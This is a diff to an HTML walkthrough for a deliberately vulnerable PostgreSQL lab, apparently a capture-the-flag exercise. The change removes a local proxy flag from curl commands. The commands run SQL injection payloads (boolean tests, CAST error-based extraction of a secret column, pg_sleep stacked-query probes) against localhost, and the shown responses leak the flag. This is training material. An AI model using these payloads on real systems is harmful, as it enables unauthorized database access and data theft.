@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse"<br><br>
         <span class="prompt">Response: </span>1 | Wireless Mouse | 142
     </div>
 </div>
@@ -29,9 +29,9 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>1 | Wireless Mouse | 142 (TRUE -- row returned)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=Mouse' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No items found matching your search. (FALSE -- no rows)
     </div>
 </div>
@@ -49,7 +49,7 @@
         <span class="terminal-title">Step 3. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_dbl1nk_dns_3xf1l}"
     </div>
 </div>
@@ -68,7 +68,7 @@
         <span class="terminal-title">Step 4. Stacked Query Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>time curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item='; SELECT pg_sleep(2) -- -"<br><br>
+        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item='; SELECT pg_sleep(2) -- -"<br><br>
         <span class="prompt">Response: </span>(2-second delay confirmed -- stacked queries work!)<br>
         real    0m2.041s
     </div>
@@ -88,7 +88,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab11" \<br> --data-urlencode "item=' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_dbl1nk_dns_3xf1l}"
     </div>
 </div>
